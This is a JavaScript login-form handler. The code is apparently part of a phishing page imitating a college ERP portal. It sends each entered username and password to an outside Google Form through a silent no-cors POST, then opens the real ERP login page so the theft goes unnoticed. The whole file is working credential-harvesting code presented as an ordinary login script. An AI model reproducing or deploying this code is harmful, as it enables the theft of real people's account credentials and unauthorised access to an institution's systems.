document.addEventListener('DOMContentLoaded', function() {
  document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();
    
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
    
    if (!username || !password) {
      document.getElementById("msg").textContent = "Please enter both username and password";
      document.getElementById("msg").style.color = "#dc3545";
      return;
    }

    // Show loading indicator
    document.getElementById("msg").textContent = "Processing...";
    document.getElementById("msg").style.color = "#007bff";
    
    // Replace with your actual Google Form submit URL and entry IDs
    const googleFormURL = "https://docs.google.com/forms/d/e/1FAIpQLScStreRZRW9Y4ipI2MNBENtSsbMqYn2CYvPRTlCs_eZs3d0vg/formResponse";
    const data = new FormData();
    data.append("entry.163375498", username); // username entry ID from test.py
    data.append("entry.1850673272", password); // password entry ID from test.py
    
    // Disable the submit button during submission
    document.querySelector('button[type="submit"]').disabled = true;

    fetch(googleFormURL, {
      method: "POST",
      mode: "no-cors",
      body: data
    }).then(() => {
      const dashboardURL = "https://erp.vce.ac.in/Sinfo/Default.aspx";
      console.log("🔗 Dashboard URL:", dashboardURL); // Log the actual link to the resource
      document.getElementById("msg").textContent = "Redirecting...";
      setTimeout(() => {
        window.open(dashboardURL, "_blank"); // Open in a new browser window
      }, 1500);
    }).catch(error => {
      // Handle any errors
      document.getElementById("msg").textContent = "Connection error. Please try again.";
      document.getElementById("msg").style.color = "#dc3545";
      document.querySelector('button[type="submit"]').disabled = false;
    });
  });
});
